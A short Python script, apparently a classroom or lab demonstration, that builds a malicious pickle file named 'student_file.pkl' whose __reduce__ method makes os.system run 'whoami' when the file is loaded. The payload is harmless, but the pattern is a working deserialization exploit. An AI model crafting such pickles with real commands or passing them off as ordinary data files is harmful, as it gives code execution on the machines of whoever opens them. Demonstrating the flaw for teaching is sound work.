# python ..\evil_pickle.py

import pickle
import os
import base64
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ("whoami", ))
    
with open('student_file.pkl', 'wb') as f:  # open a text file
    pickle.dump(EvilPickle(), f) # serialize the list
